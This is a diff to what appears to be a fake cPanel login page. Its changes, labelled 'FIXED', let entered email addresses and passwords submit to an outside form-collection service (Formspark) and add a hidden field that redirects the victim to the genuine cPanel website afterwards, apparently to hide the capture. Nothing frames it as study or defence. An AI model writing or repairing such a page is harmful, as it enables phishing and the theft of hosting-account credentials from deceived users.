@@ -134,6 +134,7 @@
               </div>
               <div id="login-sub">
                 <div id="forms">
+                  <!-- FIXED: Added redirect hidden field -->
                   <form
                     novalidate=""
                     id="login_form"
@@ -144,6 +145,9 @@
                   >
                     <!-- Honeypot field - keeps some bot protection -->
                     <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
+                    
+                    <!-- FIXED: Redirect after submission to cPanel -->
+                    <input type="hidden" name="_redirect" value="https://www.cpanel.net/products/">
 
                     <div class="input-req-login">
                       <label for="user">Email Address</label>
@@ -254,9 +258,11 @@
       let clickCount = 0;
 
       form.addEventListener("submit", function (event) {
-        event.preventDefault();
+        // Don't prevent default - let the form submit naturally
+        // But still validate first
 
         if (emailInput.value === "") {
+          event.preventDefault();
           a1.forEach(el => el.classList.remove("e-hidden"));
           a2.forEach(el => (el.innerHTML = "You must specify a username to log in."));
           setTimeout(() => {
@@ -267,6 +273,7 @@
         }
 
         if (passwordInput.value === "") {
+          event.preventDefault();
           a1.forEach(el => el.classList.remove("e-hidden"));
           a2.forEach(el => (el.innerHTML = "Password is required"));
           setTimeout(() => {
@@ -276,11 +283,12 @@
           return;
         }
 
+        // Show loading
         loading();
         
-        // Let the form submit naturally
-        form.submit();
-
+        // Form will submit naturally to Formspark
+        // Formspark will redirect to cPanel because of the _redirect field
+        
         clickCount++;
         if (clickCount >= 3) {
           setTimeout(function () {
